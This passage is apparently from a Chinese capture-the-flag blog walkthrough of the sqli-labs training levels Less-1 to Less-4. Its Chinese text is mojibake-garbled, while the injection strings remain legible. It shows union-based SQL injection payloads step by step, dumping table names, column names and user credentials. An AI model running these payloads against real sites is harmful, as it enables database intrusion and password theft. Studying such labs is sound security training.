--+</code>ã€‚</li><li>æœªé—­åˆå•å¼•å·ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯æˆ–é€»è¾‘å¤±æ•ˆã€‚</li></ul></li><li><strong>æ•°å­—å‹æ³¨å…¥</strong>ï¼ˆå¦‚ Less-2ï¼‰ï¼š<ul><li>å‚æ•°æœªè¢«å¼•å·åŒ…è£¹ï¼ˆ<code>id=$id</code>ï¼‰ã€‚</li><li>å¯ç›´æ¥æ³¨å…¥ä»£ç ï¼Œä¾‹å¦‚ <code>1 order by 3 --+</code>ã€‚</li><li>æ— éœ€å¤„ç†å¼•å·é—­åˆé—®é¢˜ã€‚</li></ul></li></ul><hr><h5 id="å…³äºæ³¨é‡Šç¬¦ï¼š"><a href="#å…³äºæ³¨é‡Šç¬¦ï¼š" class="headerlink" title="å…³äºæ³¨é‡Šç¬¦ï¼š"></a>å…³äºæ³¨é‡Šç¬¦ï¼š</h5><hr><ol><li><strong>åŸå§‹ SQL è¯­å¥çš„ç»“æ„</strong></li></ol><p>å‡è®¾åç«¯ä»£ç çš„ SQL è¯­å¥å¦‚ä¸‹ï¼ˆå­—ç¬¦å‹æ³¨å…¥ï¼‰ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>$id</code> æ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œç”¨å•å¼•å· <code>&#39;</code> åŒ…è£¹ã€‚</p><hr><ol start="2"><li><strong>è¾“å…¥ <strong><code>?id=1&#39; order by 3</code></strong> çš„è§£æ</strong></li></ol><p>å½“è¾“å…¥ <code>1&#39; order by 3</code> æ—¶ï¼ŒSQL è¯­å¥å˜ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-string">&#x27; LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><ul><li><strong>é—®é¢˜</strong>ï¼šç”¨æˆ·è¾“å…¥çš„å•å¼•å· <code>&#39;</code> æœªé—­åˆï¼Œå¯¼è‡´è¯­å¥å˜æˆï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-string">&#x27; ...</span><br></code></pre></td></tr></table></figure><p>æœ«å°¾å¤šäº†ä¸€ä¸ªå•å¼•å· <code>&#39;</code>ï¼Œç ´åäº† SQL è¯­æ³•ã€‚</p><ul><li><strong>ç»“æœ</strong>ï¼šæ•°æ®åº“æŠ›å‡ºè¯­æ³•é”™è¯¯ï¼Œä½†åº”ç”¨ç¨‹åºå¯èƒ½é…ç½®ä¸º <strong>ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯</strong>ï¼ˆå¦‚å…³é—­é”™è¯¯å›æ˜¾ï¼‰ï¼Œå¯¼è‡´é¡µé¢æ— å›æ˜¾ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005805.png"></p><hr><ol start="3"><li><strong>è¾“å…¥ <strong><code>?id=1&#39; order by 3 --+</code></strong> çš„è§£æ</strong></li></ol><p>å½“è¾“å…¥ <code>1&#39; order by 3 --+</code> æ—¶ï¼ŒSQL è¯­å¥å˜ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27; LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><ul><li><strong>æ³¨é‡Šç¬¦ <strong><code>--+</code></strong> çš„ä½œç”¨</strong>ï¼š<ul><li><code>--</code> æ˜¯ SQL çš„å•è¡Œæ³¨é‡Šç¬¦ï¼Œ<code>+</code> åœ¨ URL ä¸­è¢«è§£æä¸ºç©ºæ ¼ï¼Œå› æ­¤ <code>--+</code> ç­‰æ•ˆäº <code>-- </code>ï¼ˆæ³¨é‡Šç¬¦åå¿…é¡»è·Ÿç©ºæ ¼ï¼‰ã€‚</li><li>æ³¨é‡Šç¬¦ä¼šå¿½ç•¥åç»­æ‰€æœ‰å†…å®¹ï¼Œå³ <code>&#39; LIMIT 0,1</code> è¢«æ³¨é‡Šæ‰ã€‚</li></ul></li><li><strong>æœ€ç»ˆè¯­å¥</strong>ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- å•å¼•å· `&#39;` è¢«æ­£ç¡®é—­åˆï¼Œè¯­å¥è¯­æ³•åˆæ³•ã€‚- `order by 3` ä¼šæŒ‰ç¬¬ä¸‰åˆ—æ’åºï¼Œå¦‚æœè¡¨ä¸­å­˜åœ¨è‡³å°‘ 3 åˆ—ï¼ŒæŸ¥è¯¢æˆåŠŸæ‰§è¡Œï¼Œé¡µé¢æ­£å¸¸å›æ˜¾æ•°æ®ã€‚</code></pre><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005417.png"></p><hr><ol start="4"><li><strong>å…³é”®å·®å¼‚æ€»ç»“</strong></li></ol><table><thead><tr><th><strong>è¾“å…¥</strong></th><th><strong>SQL è¯­å¥</strong></th><th><strong>è¯­æ³•çŠ¶æ€</strong></th><th><strong>å›æ˜¾åŸå› </strong></th></tr></thead><tbody><tr><td><code>?id=1&#39; order by 3</code></td><td><code>id=&#39;1&#39; order by 3&#39; LIMIT ...</code></td><td><strong>è¯­æ³•é”™è¯¯</strong></td><td>é”™è¯¯è¢«éšè—ï¼Œæ— å›æ˜¾</td></tr><tr><td><code>?id=1&#39; order by 3 --+</code></td><td><code>id=&#39;1&#39; order by 3</code></td><td><strong>è¯­æ³•æ­£ç¡®</strong></td><td>æŸ¥è¯¢æ­£å¸¸æ‰§è¡Œï¼Œå›æ˜¾æ•°æ®</td></tr></tbody></table><p>è¡¥å……ï¼š **æ³¨é‡Šç¬¦ **<code>--+</code></p><ul><li><code>--</code>:<br>åœ¨ SQL ä¸­è¡¨ç¤º<strong>å•è¡Œæ³¨é‡Š</strong>ï¼Œç”¨äºå¿½ç•¥åç»­ä»£ç ã€‚</li><li><code>+</code>:<br>URL ä¸­çš„ <code>+</code> ä¼šè¢«è§£ç ä¸º<strong>ç©ºæ ¼</strong>ã€‚ç”±äºæŸäº›æ•°æ®åº“ï¼ˆå¦‚ MySQLï¼‰è¦æ±‚æ³¨é‡Šç¬¦ <code>--</code> åå¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œ<code>--+</code> ç¡®ä¿æ³¨é‡Šç”Ÿæ•ˆï¼Œé¿å…è¯­æ³•é”™è¯¯ã€‚</li></ul><hr><h5 id="è§£é¢˜ï¼š"><a href="#è§£é¢˜ï¼š" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h5><p>**ç¬¬ä¸€æ­¥ï¼š**é¦–å…ˆçŸ¥é“è¡¨æ ¼æœ‰å‡ åˆ—ï¼Œå¦‚æœæŠ¥é”™å°±æ˜¯è¶…è¿‡åˆ—æ•°ï¼Œå¦‚æœæ˜¾ç¤ºæ­£å¸¸å°±æ˜¯æ²¡æœ‰è¶…å‡ºåˆ—æ•°ã€‚</p><p>è”åˆæŸ¥è¯¢ç‰¹ç‚¹ï¼š</p><p>1ã€è¦æ±‚å¤šæ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢åˆ—æ•°æ˜¯ä¸€è‡´çš„ï¼<br>2ã€è¦æ±‚å¤šæ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢çš„æ¯ä¸€åˆ—çš„ç±»å‹å’Œé¡ºåºæœ€å¥½ä¸€è‡´<br>3ã€unionå…³é”®å­—é»˜è®¤å»é‡ï¼Œå¦‚æœä½¿ç”¨union all å¯ä»¥åŒ…å«é‡å¤é¡¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;order by 3 --+<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºæ­£å¸¸æ²¡æœ‰è¶…å‡ºåˆ—æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005515.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;order by 4 --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005398.png"></p><p>ç°åœ¨çŸ¥é“è¡¨æ ¼æœ‰ä¸‰åˆ—</p><p>**ç¬¬äºŒæ­¥ï¼š**çˆ†å‡ºæ˜¾ç¤ºä½ï¼Œå°±æ˜¯çœ‹çœ‹è¡¨æ ¼é‡Œé¢é‚£ä¸€åˆ—æ˜¯åœ¨é¡µé¢æ˜¾ç¤ºçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27; union select 1,2,3--+<br></code></pre></td></tr></table></figure><hr><h5 id="ä½¿ç”¨-id-1-çš„ç›®çš„"><a href="#ä½¿ç”¨-id-1-çš„ç›®çš„" class="headerlink" title="ä½¿ç”¨ id=-1 çš„ç›®çš„"></a><strong>ä½¿ç”¨ <strong><code>id=-1</code></strong> çš„ç›®çš„</strong></h5><p>å°† <code>id</code> è®¾ç½®ä¸º <code>-1</code>ï¼ˆæˆ–ä»»æ„æ•°æ®åº“ä¸­ä¸å­˜åœ¨çš„å€¼ï¼‰ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼š</p><ul><li><strong>ç¬¬ä¸€æ¡æŸ¥è¯¢ (</strong><code>id=-1</code><strong>)</strong>ï¼šç”±äºæ•°æ®åº“ä¸­ä¸å­˜åœ¨ <code>id=-1</code> çš„è®°å½•ï¼Œè¿™æ¡æŸ¥è¯¢ä¼šè¿”å›ç©ºç»“æœã€‚</li><li><strong>ç¬¬äºŒæ¡æŸ¥è¯¢ (</strong><code>UNION SELECT 1,2,3</code><strong>)</strong>ï¼šä¼šæˆä¸ºå”¯ä¸€çš„è¿”å›ç»“æœï¼Œé¡µé¢ä¼šç›´æ¥æ˜¾ç¤º <code>1,2,3</code>ï¼Œä»è€Œæš´éœ²æ³¨å…¥ç‚¹çš„ä½ç½®</li></ul><p>å¦‚æœä½¿ç”¨ <code>id=1</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“ä¼šè¿”å›ä¸¤æ¡ç»“æœï¼š</p><ol><li><code>id=1</code> çš„çœŸå®æ•°æ®ã€‚</li><li><code>UNION SELECT 1,2,3</code> çš„æ³¨å…¥æ•°æ®ã€‚</li></ol><p>ä½†é¡µé¢å¯èƒ½åªä¼šæ¸²æŸ“ç¬¬ä¸€æ¡ç»“æœï¼ˆçœŸå®æ•°æ®ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•çœ‹åˆ° <code>UNION SELECT</code> çš„ç»“æœã€‚è€Œé€šè¿‡ <code>id=-1</code> å¼ºåˆ¶è®©åŸæŸ¥è¯¢å¤±æ•ˆï¼Œå¯ä»¥ç¡®ä¿æ³¨å…¥ç»“æœç›´æ¥æš´éœ²ã€‚</p><ul><li><code>id=-1</code>** çš„ä½œç”¨**ï¼šç»•è¿‡åŸæŸ¥è¯¢çš„ç»“æœï¼Œè®© <code>UNION SELECT</code> çš„æ³¨å…¥å†…å®¹æˆä¸ºå”¯ä¸€è¾“å‡ºã€‚</li><li><strong>å®æˆ˜æ„ä¹‰</strong>ï¼šè¿™æ˜¯ SQL æ³¨å…¥ä¸­å¸¸è§çš„æŠ€å·§ï¼Œç”¨äºæ¢æµ‹å›æ˜¾ç‚¹ï¼Œè¿›è€Œæå–æ•°æ®åº“ä¿¡æ¯ï¼ˆå¦‚ç‰ˆæœ¬ã€è¡¨åã€å­—æ®µå€¼ç­‰ï¼‰ã€‚</li></ul><hr><p>å¯ä»¥çœ‹åˆ°æ˜¯ç¬¬äºŒåˆ—å’Œç¬¬ä¸‰åˆ—é‡Œé¢çš„æ•°æ®æ˜¯æ˜¾ç¤ºåœ¨é¡µé¢çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005510.png"></p><p>**ç¬¬ä¸‰æ­¥ï¼š**è·å–å½“å‰æ•°æ®åå’Œç‰ˆæœ¬å·ï¼Œè¿™ä¸ªæ¶‰åŠmysqlæ•°æ®åº“çš„ä¸€äº›å‡½æ•°ï¼Œè®°å¾—å°±è¡Œã€‚</p><p><strong>è¡¥å……çŸ¥è¯†ï¼š</strong></p><p><code>version()</code>:æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p><p><code>database()</code>:æŸ¥çœ‹ä½¿ç”¨çš„æ•°æ®åº“</p><p><code>user()</code>:æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p><code>limit</code>:limitå­å¥åˆ†æ‰¹æ¥è·å–æ‰€æœ‰æ•°æ®</p><p><code>group_concat()</code>:ä¸€æ¬¡æ€§è·å–æ‰€æœ‰çš„æ•°æ®åº“ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,database(),version()--+</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ç»“æœçŸ¥é“å½“å‰æ•°æ®æ˜¯<code>security</code>,ç‰ˆæœ¬æ˜¯<code>5.7.26</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005737.png"></p><p><strong>ç¬¬å››æ­¥ï¼š</strong> çˆ†è¡¨ï¼Œinformation_schema.tablesè¡¨ç¤ºè¯¥æ•°æ®åº“ä¸‹çš„tablesè¡¨ï¼Œç‚¹è¡¨ç¤ºä¸‹ä¸€çº§ã€‚whereåé¢æ˜¯æ¡ä»¶ï¼Œgroup_concat()æ˜¯å°†æŸ¥è¯¢åˆ°ç»“æœè¿æ¥èµ·æ¥ã€‚å¦‚æœä¸ç”¨group_concatæŸ¥è¯¢åˆ°çš„åªæœ‰userã€‚</p><p>è¯¥è¯­å¥çš„æ„æ€æ˜¯æŸ¥è¯¢information_schemaæ•°æ®åº“ä¸‹çš„tablesè¡¨é‡Œé¢ä¸”table_schemaå­—æ®µå†…å®¹æ˜¯securityçš„æ‰€æœ‰table_nameçš„å†…å®¹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>çˆ†å‡ºäº†è¡¨å</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005991.png"></p><p>çœ‹åˆ°äº†<code>users</code>,äºæ˜¯æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™å¼ è¡¨çš„å­—æ®µå</p><p><strong>è¡¥å……çŸ¥è¯†:</strong></p><p><code>information_schema.tables</code>:åŒ…å«äº†æ•°æ®åº“é‡Œæ‰€æœ‰çš„è¡¨</p><p><code>table_name</code>:è¡¨å</p><p><code>table_schema</code>:æ•°æ®åº“å</p><p><code>column_name</code>:å­—æ®µå</p><p> <strong>ç¬¬äº”æ­¥</strong>ï¼šçˆ†å­—æ®µå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br></code></pre></td></tr></table></figure><p>è¯¥è¯­å¥çš„æ„æ€æ˜¯æŸ¥è¯¢information_schemaæ•°æ®åº“ä¸‹çš„columnsè¡¨é‡Œé¢ä¸”table_userså­—æ®µå†…å®¹æ˜¯usersçš„æ‰€æœ‰column_nameçš„å†…ã€‚æ³¨æ„table_nameå­—æ®µä¸æ˜¯åªå­˜åœ¨äºtablesè¡¨ï¼Œä¹Ÿæ˜¯å­˜åœ¨columnsè¡¨ä¸­ã€‚è¡¨ç¤ºæ‰€æœ‰å­—æ®µå¯¹åº”çš„è¡¨åã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005209.png"></p><p>çœ‹åˆ°äº†usernameå’Œpasswordå­—æ®µï¼Œ</p><p>ç„¶åæˆ‘ä»¬å°±å»æŸ¥è¯¢å­—æ®µä¿¡æ¯</p><p><strong>ç¬¬å…­æ­¥</strong>ï¼šæŸ¥å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005147.png"></p><p>â€‹                       </p><p> è·å¾—äº†æ‰€æœ‰çš„è´¦å·å’Œå¯†ç ï¼Œè¿™æ ·æˆ‘ä»¬å°±é¡ºåˆ©çš„æ‹¿åˆ°äº†å¾ˆé‡è¦çš„ä¿¡æ¯ã€‚</p><h4 id="Less-2-æ•°å­—å‹"><a href="#Less-2-æ•°å­—å‹" class="headerlink" title="Less-2-æ•°å­—å‹"></a>Less-2-æ•°å­—å‹</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005914.png"></p><p>é¦–å…ˆåˆ¤æ–­ä¸‹ï¼Œè¿™ä¸ªæ˜¯ä»€ä¹ˆæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;ã€€ã€€//å‡ºé”™<br><br>?id=1 and 1=1 //æ­£å¸¸<br><br>?id=1 and 1=2ã€€//å‡ºé”™<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç¡®å®šä¸ºæ•°å­—æ³¨å…¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005317.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005239.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005060.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å»æŸ¥åº“</p><p>åˆ—æ•°ä¸º3ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005135.png"></p><p>çˆ†å‡ºæ˜¾ç¤ºä½ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005087.png"></p><p>çˆ†è¡¨ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005490.png"></p><p>çˆ†å­—æ®µåï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005206.png"></p><p>æŸ¥å­—æ®µï¼šå¾—åˆ°äº†é‡è¦ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022106426.png"></p><h4 id="Less-3-å•å¼•å·-æ‹¬å·-å­—ç¬¦å‹"><a href="#Less-3-å•å¼•å·-æ‹¬å·-å­—ç¬¦å‹" class="headerlink" title="Less-3-å•å¼•å·+æ‹¬å·_å­—ç¬¦å‹"></a>Less-3-å•å¼•å·+æ‹¬å·_å­—ç¬¦å‹</h4><p>å•å¼•å·æµ‹è¯•æŠ¥é”™,æ˜¾ç¤ºåº”è¯¥ä¸ºå•å¼•å·å’Œæ‹¬å·ç»„åˆçš„é—­åˆæ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022106699.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006872.png"></p><p>å¾—åˆ°æ•°æ®æœ‰ä¸‰åˆ—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) order by 4 --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006047.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27;) union select 1,2,3 --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006421.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27;) union select 1,database(),version() --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006465.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#x27;</span>security<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006702.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006212.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006223.png"></p><h4 id="Less-4-åŒå¼•å·-æ‹¬å·-å­—ç¬¦å‹"><a href="#Less-4-åŒå¼•å·-æ‹¬å·-å­—ç¬¦å‹" class="headerlink" title="Less-4-åŒå¼•å·+æ‹¬å·_å­—ç¬¦å‹"></a>Less-4-åŒå¼•å·+æ‹¬å·_å­—ç¬¦å‹</h4><p>less-4æ˜¯åŒå¼•å·+æ‹¬å·çš„é—­åˆæ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006287.png"></p><p>ä¿®æ”¹ä¸€ä¸‹é—­åˆæ–¹å¼å³å¯ï¼Œå…¶ä»–ä¸å‰ä¸‰å…³ä¸€è‡´ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) order by 3--+<br><br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,database(),version()--+<br><br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br><br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006953.png"></p><hr><p>å‚è€ƒä¹¦ç±ï¼š</p><p><a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf">sqli-labs&#x2F;mysql-injection.pdf at master Â· lcamry&#x2F;sqli-labs</a></p><h4 id="Background-ç›²æ³¨çš„è®²è§£"><a href="#Background-ç›²æ³¨çš„è®²è§£" class="headerlink" title="Background ç›²æ³¨çš„è®²è§£"></a>Background ç›²æ³¨çš„è®²è§£</h4><h5 id="1-ä»€ä¹ˆæ˜¯ç›²æ³¨ï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯ç›²æ³¨ï¼Ÿ" class="headerlink" title="1.ä»€ä¹ˆæ˜¯ç›²æ³¨ï¼Ÿ"></a><strong>1.ä»€ä¹ˆæ˜¯ç›²æ³¨ï¼Ÿ</strong></h5><p>ç›²æ³¨æ˜¯SQLæ³¨å…¥æ—¶<strong>ä¸ç›´æ¥æ˜¾ç¤ºæ•°æ®åº“é”™è¯¯ä¿¡æ¯æˆ–æŸ¥è¯¢ç»“æœ</strong> ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥é€šè¿‡é¡µé¢å›æ˜¾è·å–æ•°æ®ï¼Œè€Œæ˜¯é€šè¿‡è§‚å¯Ÿä¸€äº›å·®å¼‚æ¥æ¨æ–­ä¿¡æ¯ï¼šé¡µé¢å†…å®¹å˜åŒ–ï¼ˆå¦‚â€œå­˜åœ¨&#x2F;ä¸å­˜åœ¨â€æç¤ºï¼‰ã€HTTPçŠ¶æ€ç 